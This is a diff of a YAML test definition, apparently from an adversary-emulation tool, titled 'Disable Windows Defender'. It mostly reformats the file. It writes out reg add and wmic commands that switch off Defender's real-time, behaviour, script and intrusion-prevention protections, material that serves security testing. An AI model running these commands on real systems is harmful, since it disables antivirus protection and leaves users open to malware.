@@ -2,10 +2,11 @@ id: b007f6e8-4a87-4440-8888-29ceab047d9b
 metadata:
   version: 2
   authors:
-    - privateducky
-    - MITRE
-    - w0rk3r
+  - privateducky
+  - MITRE
+  - w0rk3r
   tags: []
+  release_date: 2021-06-15
 name: Disable Windows Defender
 description: |
   Windows Defender is the defacto standard antivirus on Windows computers. It will block normal malicious activity on
@@ -33,10 +34,10 @@ platforms:
         reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f;
         reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f;
       variants:
-        - command: |
-            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIntrusionPreventionSystem=TRUE;
-            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableRealtimeMonitoring=TRUE;
-            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableScriptScanning=TRUE;
-            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set EnableControlledFolderAccess=0;
-            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIOAVProtection=TRUE;
-            wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableBehaviorMonitoring=TRUE;
+      - command: |-
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIntrusionPreventionSystem=TRUE;
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableRealtimeMonitoring=TRUE;
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableScriptScanning=TRUE;
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set EnableControlledFolderAccess=0;
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIOAVProtection=TRUE;
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableBehaviorMonitoring=TRUE;
